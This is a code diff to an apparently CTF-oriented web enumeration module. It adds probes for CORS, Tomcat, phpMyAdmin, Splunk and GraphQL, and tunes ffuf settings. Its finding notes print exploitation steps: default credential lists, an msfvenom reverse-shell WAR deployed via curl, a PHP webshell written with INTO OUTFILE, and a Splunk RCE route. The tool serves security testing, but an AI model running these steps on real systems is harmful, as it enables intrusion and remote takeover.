@@ -10,11 +10,16 @@ from lib.models import Discovery, Service
 from lib.runner import Runner
 from lib.scope import Scope
 
-# SecLists paths — intentionally small; quick sweep only
+# SecLists paths
 _WORDLIST_DIRS       = "/usr/share/seclists/Discovery/Web-Content/common.txt"
 _WORDLIST_DIRS_SMALL = "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"
 _WORDLIST_VHOST      = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
 _WORDLIST_API        = "/usr/share/seclists/Discovery/Web-Content/api/objects.txt"
+
+# ffuf tuning — conservative for CTF targets
+_FFUF_THREADS  = 20       # lower than before to avoid tripping rate limits / crashing services
+_FFUF_TIMEOUT  = "180"    # seconds total per ffuf run (3 min is enough for common.txt at 20 threads)
+_REQ_TIMEOUT   = "10"     # per-request timeout
 
 # ANSI escape sequence pattern
 _ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mKGHFABCDJsu]")
@@ -44,6 +49,9 @@ _SENSITIVE_PATHS = [
     ("/.DS_Store",             ".DS_Store exposed"),
     ("/crossdomain.xml",       "crossdomain.xml (Flash policy)"),
     ("/clientaccesspolicy.xml","clientaccesspolicy.xml (Silverlight policy)"),
+    ("/backup.zip",            "backup.zip exposed"),
+    ("/backup.tar.gz",         "backup.tar.gz exposed"),
+    ("/.git/COMMIT_EDITMSG",   ".git/COMMIT_EDITMSG exposed"),
 ]
 
 # ADCS web enrollment endpoints
@@ -64,6 +72,40 @@ _JENKINS_PATHS = [
     ("/api/json",       "REST API"),
 ]
 
+# Tomcat manager paths
+_TOMCAT_PATHS = [
+    ("/manager/html",         "Tomcat Manager"),
+    ("/manager/text",         "Tomcat Manager (text)"),
+    ("/host-manager/html",    "Tomcat Host Manager"),
+]
+
+# phpMyAdmin paths
+_PMA_PATHS = [
+    "/phpmyadmin", "/pma", "/phpMyAdmin", "/dbadmin", "/db/phpmyadmin",
+    "/admin/phpmyadmin", "/mysql", "/phpma",
+]
+
+# Splunk login paths
+_SPLUNK_PATHS = [
+    "/en-US/account/login",
+    "/en-GB/account/login",
+]
+
+# GraphQL endpoint paths
+_GRAPHQL_PATHS = [
+    "/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
+    "/playground", "/api/v1/graphql", "/api/v2/graphql",
+]
+
+# Security header flags for assessment
+_SEC_HEADERS = {
+    "strict-transport-security": "HSTS",
+    "x-frame-options":           "X-Frame-Options",
+    "content-security-policy":   "CSP",
+    "x-content-type-options":    "X-Content-Type-Options",
+    "permissions-policy":        "Permissions-Policy",
+}
+
 
 def enumerate_web(
     ip: str,
@@ -75,10 +117,16 @@ def enumerate_web(
     hosts: HostsManager,
     available: set[str],
     is_followup: bool = False,
+    deep: bool = False,
 ) -> list[Discovery]:
     """
-    Full web enumeration for one port/hostname.
-    Returns Discovery objects (vhosts, SSL SANs, redirects) for follow-up.
+    Web enumeration for one port/hostname.
+
+    Fast mode (default): fingerprint → sensitive files → targeted app probes →
+    single dir bust → vhost bust → crawl.
+
+    Deep mode (--deep): additionally runs cewl+dir bust, arjun param discovery,
+    and the full API endpoint scanner.
     """
     port = service.port
     scheme = service.scheme
@@ -89,7 +137,7 @@ def enumerate_web(
     if hostname != ip:
         tag += f" ({hostname})"
     findings.h3(tag)
-    print(f"[*] Web — {base_url}")
+    print(f"[*] Web — {base_url}" + ("  [deep]" if deep else ""))
 
     discoveries: list[Discovery] = []
 
@@ -97,11 +145,10 @@ def enumerate_web(
     print(f"    → fingerprint")
     fp = _fingerprint(base_url, runner, findings, available)
 
-    # ── 2. NTLM info disclosure (Windows/IIS auth header leaks hostname/domain) ─
+    # ── 2. NTLM info disclosure ────────────────────────────────────────────────
     _check_ntlm_info(ip, port, runner, findings)
 
-    # Microsoft-HTTPAPI endpoints (WinRM, RPC-over-HTTP) never have web content.
-    # The fingerprint and NTLM check above are all that's useful; bail here.
+    # Microsoft-HTTPAPI: WinRM/RPC-over-HTTP — no web content to enumerate
     if "microsoft-httpapi" in fp["server"].lower():
         findings.note(
             f"Microsoft-HTTPAPI endpoint — no web content to enumerate. "
@@ -112,7 +159,10 @@ def enumerate_web(
     # ── 3. HTTP method probe ───────────────────────────────────────────────────
     _check_http_methods(base_url, runner, findings)
 
-    # ── 4. Redirect detection (IP → domain) ───────────────────────────────────
+    # ── 4. CORS misconfiguration check ────────────────────────────────────────
+    _check_cors(base_url, runner, findings)
+
+    # ── 5. Redirect detection (IP → domain) ───────────────────────────────────
     if not is_followup:
         redirect_host = _detect_redirect(ip, port, scheme)
         if redirect_host and redirect_host != ip and scope.check(redirect_host):
@@ -122,13 +172,13 @@ def enumerate_web(
                 port=port, scheme=scheme, source=f"HTTP redirect on port {port}",
             ))
 
-    # ── 5. robots.txt ─────────────────────────────────────────────────────────
+    # ── 6. robots.txt ─────────────────────────────────────────────────────────
     _fetch_robots(base_url, runner, findings)
 
-    # ── 6. Sensitive file probes (.git, .env, phpinfo, etc.) ──────────────────
+    # ── 7. Sensitive file probes ───────────────────────────────────────────────
     _check_sensitive_files(base_url, runner, findings, available)
 
-    # ── 7. SSL cert — extract CN / SANs ───────────────────────────────────────
+    # ── 8. SSL cert — extract CN / SANs ───────────────────────────────────────
     if scheme == "https":
         ssl_names = _extract_ssl_names(ip, port, runner, findings)
         for name in ssl_names:
@@ -138,51 +188,62 @@ def enumerate_web(
                     port=port, scheme="https", source=f"SSL certificate on port {port}",
                 ))
 
-    # ── 8. testssl.sh — SSL/TLS vulnerability scan ────────────────────────────
+    # ── 9. testssl.sh ─────────────────────────────────────────────────────────
     if scheme == "https" and "testssl.sh" in available:
         _run_testssl(ip, port, runner, findings)
 
-    # ── 9. ADCS probe (relevant on any web port on a DC) ──────────────────────
+    # ── 10. ADCS probe ────────────────────────────────────────────────────────
     _check_adcs(base_url, ip, runner, findings)
 
-    # ── 9b. Next.js-specific enumeration ──────────────────────────────────────
+    # ── 11. Next.js ───────────────────────────────────────────────────────────
     if fp.get("is_nextjs"):
         print(f"    → Next.js enumeration")
         _check_nextjs(base_url, runner, findings)
 
-    # ── 10. WordPress detection + wpscan ──────────────────────────────────────
+    # ── 12. WordPress ─────────────────────────────────────────────────────────
     if "wpscan" in available:
         _wpscan(base_url, runner, findings)
 
-    # ── 11. CMS detection — Joomla + Drupal ───────────────────────────────────
+    # ── 13. CMS detection — Joomla + Drupal ───────────────────────────────────
     _check_cms(base_url, runner, findings, available)
 
-    # ── 12. Jenkins probe ─────────────────────────────────────────────────────
+    # ── 14. Jenkins ───────────────────────────────────────────────────────────
     _check_jenkins(base_url, runner, findings)
 
-    # ── 13. Directory + file bust ──────────────────────────────────────────────
+    # ── 15. Tomcat manager ────────────────────────────────────────────────────
+    _check_tomcat(base_url, ip, runner, findings)
+
+    # ── 16. phpMyAdmin ────────────────────────────────────────────────────────
+    _check_phpmyadmin(base_url, runner, findings)
+
+    # ── 17. Splunk ────────────────────────────────────────────────────────────
+    _check_splunk(base_url, runner, findings)
+
+    # ── 18. GraphQL ───────────────────────────────────────────────────────────
+    _check_graphql(base_url, runner, findings)
+
+    # ── 19. Directory bust ────────────────────────────────────────────────────
     if "ffuf" in available:
         print(f"    → dir bust")
         _dir_bust(base_url, runner, findings, fp)
 
-    # ── 14. API endpoint discovery ────────────────────────────────────────────
-    if "ffuf" in available:
-        print(f"    → API bust")
+    # ── 20. API endpoint discovery (deep only) ────────────────────────────────
+    if deep and "ffuf" in available:
+        print(f"    → API bust (deep)")
         _api_bust(base_url, runner, findings)
 
-    # ── 14b. Parameter discovery ──────────────────────────────────────────────
-    if "arjun" in available:
-        _param_fuzz(base_url, runner, findings)
-
-    # ── 15. cewl custom wordlist + targeted dir bust ──────────────────────────
-    if "cewl" in available and "ffuf" in available:
-        print(f"    → cewl wordlist")
+    # ── 21. cewl + targeted dir bust (deep only) ──────────────────────────────
+    if deep and "cewl" in available and "ffuf" in available:
+        print(f"    → cewl wordlist (deep)")
         cewl_wl = _run_cewl(base_url, runner, findings)
         if cewl_wl:
-            print(f"    → cewl dir bust")
             _dir_bust_cewl(base_url, cewl_wl, runner, findings, fp)
 
-    # ── 16. Vhost bust ────────────────────────────────────────────────────────
+    # ── 22. Parameter discovery (deep only) ───────────────────────────────────
+    if deep and "arjun" in available:
+        _param_fuzz(base_url, runner, findings)
+
+    # ── 23. Vhost bust ────────────────────────────────────────────────────────
     if not is_followup and domain and "ffuf" in available:
         print(f"    → vhost bust")
         vhosts = _vhost_bust(ip, port, scheme, domain, runner, findings)
@@ -193,7 +254,7 @@ def enumerate_web(
                     port=port, scheme=scheme, source=f"ffuf vhost bust port {port}",
                 ))
 
-    # ── 17. Crawl ─────────────────────────────────────────────────────────────
+    # ── 24. Crawl ─────────────────────────────────────────────────────────────
     if "gospider" in available:
         print(f"    → crawl")
         _crawl(base_url, scope, runner, findings)
@@ -255,11 +316,31 @@ def _parse_interesting_headers(raw: str, findings: Findings):
         "location", "set-cookie", "www-authenticate", "content-security-policy",
         "x-frame-options", "access-control-allow-origin",
     }
+    seen_sec: set[str] = set()
     for line in raw.splitlines():
         if ":" in line:
             key = line.split(":", 1)[0].strip().lower()
             if key in interesting:
                 findings.bullet(f"`{line.strip()}`")
+            if key in _SEC_HEADERS:
+                seen_sec.add(key)
+            # Flag insecure cookie attributes
+            if key == "set-cookie":
+                val = line.lower()
+                issues = []
+                if "httponly" not in val:
+                    issues.append("missing HttpOnly")
+                if "secure" not in val:
+                    issues.append("missing Secure")
+                if "samesite" not in val:
+                    issues.append("missing SameSite")
+                if issues:
+                    findings.note(f"Cookie flags: {', '.join(issues)} — `{line.strip()}`")
+
+    # Report missing security headers (HTTPS context implied if any are present)
+    missing = [label for hdr, label in _SEC_HEADERS.items() if hdr not in seen_sec]
+    if missing and "HTTP/" in raw:
+        findings.note(f"Missing security headers: {', '.join(missing)}")
 
 
 # ── NTLM info disclosure ──────────────────────────────────────────────────────
@@ -424,6 +505,174 @@ def _run_testssl(ip: str, port: int, runner: Runner, findings: Findings):
         findings.bullet("**testssl findings:**")
         for line in hits[:20]:
             findings.bullet(f"  {line}")
+
+
+# ── CORS misconfiguration ────────────────────────────────────────────────────
+
+def _check_cors(base_url: str, runner: Runner, findings: Findings):
+    """Check for CORS misconfiguration — reflected origin with credentials."""
+    result = subprocess.run(
+        ["curl", "-sk", "--max-time", "10", "-H", "Origin: https://evil-p0rtix.com",
+         "-I", base_url],
+        capture_output=True, text=True,
+    )
+    acao = ""
+    acac = ""
+    for line in result.stdout.splitlines():
+        ll = line.lower()
+        if "access-control-allow-origin" in ll:
+            acao = line.strip()
+        if "access-control-allow-credentials" in ll:
+            acac = line.strip()
+    if not acao:
+        return
+    if "evil-p0rtix.com" in acao or acao.endswith("*"):
+        severity = "**CORS: wildcard or reflected origin**" if "*" in acao else "**CORS: origin reflected**"
+        findings.h4("CORS Misconfiguration")
+        findings.bullet(f"{severity}: `{acao}`")
+        if acac:
+            findings.bullet(f"  `{acac}`")
+        if "evil-p0rtix.com" in acao and "true" in acac.lower():
+            findings.add_summary(f"**CORS: credentialed cross-origin read** at `{base_url}`")
+            findings.note(
+                "Exploit: victim must be authenticated to target. "
+                "Host JS that calls `fetch(target_url, {credentials:'include'})` and exfils response."
+            )
+        else:
+            findings.add_summary(f"CORS misconfiguration at `{base_url}`")
+
+
+# ── Tomcat manager probe ──────────────────────────────────────────────────────
+
+def _check_tomcat(base_url: str, ip: str, runner: Runner, findings: Findings):
+    """Detect Tomcat manager — 401 = exists, 200 = no auth."""
+    found: list[tuple[str, str, str]] = []
+    for path, label in _TOMCAT_PATHS:
+        r = subprocess.run(
+            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
+             "-w", "%{http_code}", f"{base_url}{path}"],
+            capture_output=True, text=True,
+        )
+        code = r.stdout.strip()
+        if code in ("200", "401", "403", "302"):
+            found.append((path, label, code))
+
+    if not found:
+        return
+
+    findings.h4("Apache Tomcat")
+    for path, label, code in found:
+        if code == "200":
+            findings.bullet(f"**{label} ACCESSIBLE (no auth):** `{base_url}{path}`")
+            findings.add_summary(f"**Tomcat manager open (no auth)** at `{base_url}{path}` — WAR upload = RCE")
+        elif code == "401":
+            findings.bullet(f"**{label}:** `{base_url}{path}` — HTTP 401 (auth required)")
+            findings.add_summary(f"Tomcat manager at `{base_url}{path}` — try default creds")
+        else:
+            findings.bullet(f"{label}: `{base_url}{path}` — HTTP {code}")
+
+    if any(c in ("200", "401") for _, _, c in found):
+        findings.note(
+            "Default creds: tomcat:tomcat, admin:admin, tomcat:s3cret, admin:s3cret, manager:manager. "
+            "With access: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war` "
+            f"→ `curl -u admin:admin {base_url}/manager/text/deploy?path=/shell --upload-file shell.war` "
+            f"→ `curl {base_url}/shell/`"
+        )
+
+
+# ── phpMyAdmin probe ──────────────────────────────────────────────────────────
+
+def _check_phpmyadmin(base_url: str, runner: Runner, findings: Findings):
+    """Detect phpMyAdmin installation."""
+    for path in _PMA_PATHS:
+        r = subprocess.run(
+            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
+             "-w", "%{http_code}", f"{base_url}{path}"],
+            capture_output=True, text=True,
+        )
+        code = r.stdout.strip()
+        if code in ("200", "302"):
+            findings.h4("phpMyAdmin")
+            findings.bullet(f"**phpMyAdmin detected:** `{base_url}{path}`")
+            findings.add_summary(f"phpMyAdmin at `{base_url}{path}` — try root/'', root/root, root/toor")
+            findings.note(
+                "With access: `SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` "
+                "(requires FILE privilege + write access to webroot)"
+            )
+            return
+
+
+# ── Splunk probe ──────────────────────────────────────────────────────────────
+
+def _check_splunk(base_url: str, runner: Runner, findings: Findings):
+    """Detect Splunk Web — default creds: admin/changeme."""
+    for path in _SPLUNK_PATHS:
+        r = subprocess.run(
+            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
+             "-w", "%{http_code}", f"{base_url}{path}"],
+            capture_output=True, text=True,
+        )
+        if r.stdout.strip() in ("200", "302", "301"):
+            findings.h4("Splunk")
+            findings.bullet(f"**Splunk Web detected:** `{base_url}{path}`")
+            findings.add_summary(f"Splunk at `{base_url}` — default: admin/changeme. UF on 8089 = RCE via app")
+            findings.note(
+                "Test default creds: admin/changeme. "
+                "Admin access on Universal Forwarder (port 8089) → deploy malicious app → RCE as SYSTEM. "
+                "Tool: SplunkWhisperer2 / PySplunkWhisperer2_remote.py"
+            )
+            return
+
+
+# ── GraphQL probe ─────────────────────────────────────────────────────────────
+
+def _check_graphql(base_url: str, runner: Runner, findings: Findings):
+    """Detect GraphQL endpoint and attempt introspection."""
+    for path in _GRAPHQL_PATHS:
+        r = subprocess.run(
+            ["curl", "-sk", "--max-time", "8",
+             "-X", "POST", "-H", "Content-Type: application/json",
+             "-d", '{"query":"{__typename}"}',
+             "-w", "\n%{http_code}",
+             f"{base_url}{path}"],
+            capture_output=True, text=True,
+        )
+        lines = r.stdout.rsplit("\n", 1)
+        code = lines[-1].strip() if len(lines) > 1 else "000"
+        body = lines[0] if len(lines) > 1 else r.stdout
+
+        if code not in ("200", "400") or not body.strip():
+            continue
+        if "__typename" not in body and "errors" not in body.lower() and "graphql" not in body.lower():
+            continue
+
+        findings.h4("GraphQL")
+        findings.bullet(f"**GraphQL endpoint:** `{base_url}{path}`")
+        findings.add_summary(f"GraphQL at `{base_url}{path}` — probe for introspection and injection")
+
+        # Attempt introspection
+        r2 = subprocess.run(
+            ["curl", "-sk", "--max-time", "10",
+             "-X", "POST", "-H", "Content-Type: application/json",
+             "-d", '{"query":"{__schema{types{name}}}"}',
+             f"{base_url}{path}"],
+            capture_output=True, text=True,
+        )
+        if "__schema" in r2.stdout:
+            findings.bullet("**Introspection enabled** — full schema accessible")
+            findings.note(
+                f"Dump schema: "
+                f'`curl -X POST {base_url}{path} -H "Content-Type: application/json" '
+                f"-d '{{\\\"query\\\":\\\"{{__schema{{types{{name,fields{{name}}}}}}}}\\\"}}' | python3 -m json.tool`"
+            )
+        else:
+            findings.bullet("Introspection disabled — probe field suggestions with typos")
+            findings.note(
+                f'Field suggestion probe: `curl -X POST {base_url}{path} '
+                f'-H "Content-Type: application/json" -d \'{{\"query\":\"{{ usr {{ id }} }}\"}}\' `'
+                " — look for 'Did you mean' in response"
+            )
+        return
 
 
 # ── ADCS probe ────────────────────────────────────────────────────────────────
@@ -655,18 +904,17 @@ def _dir_bust(base_url: str, runner: Runner, findings: Findings, fp: dict):
         return
 
     findings.h4("Directory Bust")
-    # No extensions on the quick sweep — keeps it fast; cewl bust handles targeted ext probing
     cmd = [
         "ffuf", "-u", f"{base_url}/FUZZ",
         "-w", wl,
         "-fc", "404",
-        "-t", "40",
-        "-timeout", "10",
+        "-t", str(_FFUF_THREADS),
+        "-timeout", _REQ_TIMEOUT,
         "-ic",
         "-noninteractive",
     ]
     findings.cmd(" ".join(cmd))
-    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_dirs", timeout=300)
+    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_dirs", timeout=int(_FFUF_TIMEOUT))
     _print_ffuf(out, findings)
 
 
@@ -691,19 +939,19 @@ def _run_cewl(base_url: str, runner: Runner, findings: Findings) -> str | None:
 
 
 def _dir_bust_cewl(base_url: str, wordlist: str, runner: Runner, findings: Findings, fp: dict):
-    """Second dir bust pass using the cewl-generated wordlist."""
+    """Second dir bust pass using the cewl-generated wordlist (deep mode only)."""
     findings.h4("Directory Bust (cewl wordlist)")
     cmd = [
         "ffuf", "-u", f"{base_url}/FUZZ",
         "-w", wordlist,
         "-fc", "404",
-        "-t", "40",
-        "-timeout", "10",
+        "-t", str(_FFUF_THREADS),
+        "-timeout", _REQ_TIMEOUT,
         "-ic",
         "-noninteractive",
     ] + _ffuf_extensions(fp)
     findings.cmd(" ".join(cmd))
-    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_cewl", timeout=300)
+    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_cewl", timeout=int(_FFUF_TIMEOUT))
     _print_ffuf(out, findings)
 
 
@@ -732,8 +980,8 @@ def _api_bust(base_url: str, runner: Runner, findings: Findings):
             "ffuf", "-u", f"{base_url}{prefix}/FUZZ",
             "-w", wl,
             "-fc", "404",
-            "-t", "40",
-            "-timeout", "10",
+            "-t", str(_FFUF_THREADS),
+            "-timeout", _REQ_TIMEOUT,
             "-ic",
             "-noninteractive",
         ]
@@ -767,8 +1015,8 @@ def _vhost_bust(ip: str, port: int, scheme: str, domain: str,
         "-H", f"Host: FUZZ.{domain}",
         "-w", _WORDLIST_VHOST,
         "-fc", "404",
-        "-t", "40",
-        "-timeout", "10",
+        "-t", str(_FFUF_THREADS),
+        "-timeout", _REQ_TIMEOUT,
         "-ic",
         "-noninteractive",
     ]
